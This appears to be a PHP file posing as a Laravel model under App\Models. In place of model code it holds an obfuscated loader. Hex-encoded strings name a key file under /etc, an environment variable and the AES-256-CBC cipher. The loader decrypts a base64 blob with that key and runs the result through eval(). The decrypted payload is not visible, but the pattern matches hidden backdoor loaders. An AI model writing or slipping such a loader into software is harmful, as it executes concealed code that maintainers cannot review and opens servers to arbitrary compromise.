<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ccf1cAwkIC22TZNCMIGpbA==');

$c=base64_decode(

'w8c/mZasbkfsiSeVrtV5s8dVr21qRSYu2VdHN6ZSHV5wGo/DF1z3K/nf4KcO12fEBfIesCv6jvCL' .
'/oCFrQObuN0Z0C7ayKDAUoJUVAGfkXMIFhA2MLi3F6oEUquP5/zzmI1vH8vi/roGloCm2tiFEvfG' .
'gRlmVaqLM8nHgFMxpamEZwr6kq6ZaNWAS4i6AwzwZr6IY3RNNE0XJfnCv6LCoPtXcI7Q/GqcwVgL' .
'YmZzVWKNWdr9LmZV8YTHVZRRFCcAqK7kVF8IihaBfLC7sh9Yt5mxrovFN3xNrM3v3uERh+OxbMCi' .
'Tf+RH14bmJ2hhTHyDIL5mCc0htDgiLpfb1vAgl35Yr1lK3J3xeLQL0z7m1gJGCQt261JzsY1zpwm' .
'lRJ/ApZ7Ov8th8Bghf+IoZdnGpsJqcP5SeYft/zHX6eWD1doncpLSibq/dYb1Fy3HPJw9sxc3Cmr' .
'JOXMZ4uU7OZgI+XVBXjdguM75xj5Xys1Lrs6FyDy/R0d8DWRQqPESXDBHp4fVY8FGRPOZRBgTP1V' .
'9PYL/SB+mvVqBw7xWAao+uLxgaeKO9Zw5MHHNdxPvnj3wj5Wx6SDAGpbIwNP402Qa/61oJhdXoVo' .
'OfuBnIniuH9byJ1K8G0nrhCoV84KJbefXHthC796aONJevHuFURGRwwYiwjCqlz/WG8yx9UDV6un' .
'w07P4WoGcUjwXdFm1h9c9OEaQSJjm+F369PmHXlv7ugEjfUAk8RKqtBdEz/NHSW9CN4w/qUUDo2f' .
'c4GoHjuqq6r3yYFvtwJ/iNhSgRjRsWhnPRaOd8Go2aOiGwpw0MHhM9ImmZN/ZnlK+DTYDwuiNTFW' .
'gQoLk5jUukoJ7RzLKC6uqT1EmoPUkKTX11eAH2ZyQE4mcUw0IUndRUusZDSfpIOX+fSmzdrVXlJq' .
'Ks2Z3nlGJJAmgB/qU5CuYkK2YimPVfz3WmEYiGSj9kCT2phHjJvqjxRTD/8CNatGvnWB5A=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

